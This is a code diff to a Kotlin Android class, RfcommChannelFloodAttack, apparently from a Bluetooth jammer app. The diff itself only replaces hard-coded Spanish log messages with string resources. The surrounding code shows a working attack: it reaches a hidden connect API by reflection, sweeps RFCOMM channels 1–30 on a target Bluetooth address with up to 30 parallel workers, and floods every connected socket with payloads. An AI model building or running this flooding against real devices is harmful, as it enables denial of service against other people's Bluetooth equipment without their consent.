@@ -6,6 +6,7 @@ import android.bluetooth.BluetoothManager
 import android.bluetooth.BluetoothSocket
 import android.content.Context
 import androidx.core.content.ContextCompat.getSystemService
+import com.eikarna.bluetoothjammer.R
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -31,8 +32,11 @@ class RfcommChannelFloodAttack(
     private val payloadSize: Int = 0
 ) : BluetoothAttack {
 
-    override val displayName = AttackType.RFCOMM_CHANNEL_FLOOD.displayName
-    override val description = AttackType.RFCOMM_CHANNEL_FLOOD.description
+    private var appContext: Context? = null
+    override val displayName: String
+        get() = appContext?.getString(AttackType.RFCOMM_CHANNEL_FLOOD.labelRes) ?: AttackType.RFCOMM_CHANNEL_FLOOD.fallbackLabel
+    override val description: String
+        get() = appContext?.getString(AttackType.RFCOMM_CHANNEL_FLOOD.descRes) ?: AttackType.RFCOMM_CHANNEL_FLOOD.fallbackDesc
 
     private val sockets = Collections.synchronizedList(mutableListOf<BluetoothSocket>())
     private var scope: CoroutineScope? = null
@@ -51,6 +55,7 @@ class RfcommChannelFloodAttack(
     override fun start(context: Context, onLog: (String) -> Unit) {
         if (running) return
         running = true
+        appContext = context.applicationContext
         val adapter = getSystemService(context, BluetoothManager::class.java)?.adapter
         if (adapter == null) {
             running = false
@@ -64,14 +69,14 @@ class RfcommChannelFloodAttack(
         }
         val method = hiddenConnectMethod
         if (method == null) {
-            onLog("[RFCOMM] API oculta no accesible por reflexión en este dispositivo")
+            onLog("[RFCOMM] " + context.getString(R.string.log_rfcomm_hidden_api))
             running = false
             return
         }
 
         val workers = threads.coerceIn(1, 30)
         scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-        onLog("[RFCOMM] Barrido de canales 1-30 (objetivo $targetAddress, $workers worker(s))")
+        onLog("[RFCOMM] " + context.getString(R.string.log_rfcomm_sweep, targetAddress, workers))
         repeat(workers) { worker ->
             scope!!.launch {
                 var probe = 0
@@ -84,18 +89,18 @@ class RfcommChannelFloodAttack(
                         socket?.connect()
                         if (socket?.isConnected == true) {
                             sockets.add(socket)
-                            onLog("[$worker][CONN] Canal $channel conectado")
+                            onLog("[$worker][CONN] " + context.getString(R.string.log_rfcomm_channel_connected, channel))
                             FloodSupport.flood(
-                                socket, payloadPattern, payloadSize, rateDelayMs,
+                                context, socket, payloadPattern, payloadSize, rateDelayMs,
                                 { running }, onLog, "$worker:C$channel"
                             )
                             sockets.remove(socket)
                         } else {
-                            onLog("[$worker][RETRY] Canal $channel rechazado")
+                            onLog("[$worker][RETRY] " + context.getString(R.string.log_rfcomm_channel_rejected, channel))
                         }
                     } catch (e: Exception) {
                         runCatching { socket?.close() }
-                        if (isActive && running) onLog("[$worker][RETRY] Canal $channel fallo")
+                        if (isActive && running) onLog("[$worker][RETRY] " + context.getString(R.string.log_rfcomm_channel_failed, channel))
                     }
                     jitterDelay(maxOf(100, rateDelayMs))
                 }
